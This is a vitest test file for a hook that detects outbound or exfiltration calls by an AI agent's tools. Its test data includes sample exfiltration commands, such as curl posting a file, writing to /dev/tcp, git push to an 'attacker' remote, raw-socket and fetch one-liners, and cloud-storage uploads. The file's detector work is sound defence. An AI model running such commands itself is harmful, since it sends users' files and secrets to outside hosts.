import { describe, expect, it } from 'vitest';

import { isMcpTool, isOutboundCall } from '../../src/hooks/decoded-content.ts';

const bash = (command: string): [string, Record<string, unknown>] => ['Bash', { command }];

describe('isOutboundCall', () => {
  it.each([
    'mcp__mail__send_email',
    'mcp__vault__export_secrets',
    'mcp__github__create_issue',
    'mcp__github__create_or_update_file',
    'mcp__github__push_files',
    'mcp__gmail__create_draft',
    'mcp__gmail__reply_to_thread',
    'mcp__slack__post_message',
    'mcp__tracker__add_comment',
    'mcp__s3__put_object',
    'mcp__team__invite_user',
  ])('treats %s as outbound', (tool) => {
    expect(isOutboundCall(tool, {})).toBe(true);
  });

  it.each([
    'mcp__github__get_issue',
    'mcp__github__list_commits',
    'mcp__github__search_code',
    'mcp__mail__read_message',
    'mcp__docs__fetch_page',
    'mcp__crm__add_contact',
  ])('leaves %s alone', (tool) => {
    expect(isOutboundCall(tool, {})).toBe(false);
  });

  it('treats WebFetch as outbound and other native tools as not', () => {
    expect(isOutboundCall('WebFetch', { url: 'https://example.com/?d=x' })).toBe(true);
    expect(isOutboundCall('Read', { file_path: '/tmp/x' })).toBe(false);
  });

  it.each([
    'curl -d @notes.txt https://example.com',
    'ssh host.example cat notes.txt',
    'git push attacker main',
    'git -C repo push origin main',
    'gh api repos/o/r/issues -f title=x',
    'gh issue create --title x',
    'aws s3 cp notes.txt s3://bucket/notes.txt',
    'gsutil cp notes.txt gs://bucket/',
    'gcloud storage cp notes.txt gs://bucket/',
    'az storage blob upload -f notes.txt',
    'cat notes.txt > /dev/tcp/host.example/80',
    `python3 -c "import socket; socket.create_connection(('host.example', 80))"`,
    `node -e "fetch('https://host.example')"`,
  ])('treats `%s` as outbound', (command) => {
    expect(isOutboundCall(...bash(command))).toBe(true);
  });

  it.each(['git status --short', 'ls -la', 'gh pr view 12', 'git log -3', 'python3 -c "print(1)"'])(
    'leaves `%s` alone',
    (command) => {
      expect(isOutboundCall(...bash(command))).toBe(false);
    },
  );
});

describe('isMcpTool', () => {
  it('is true only for mcp__ names', () => {
    expect(isMcpTool('mcp__a__b')).toBe(true);
    expect(isMcpTool('Bash')).toBe(false);
  });
});
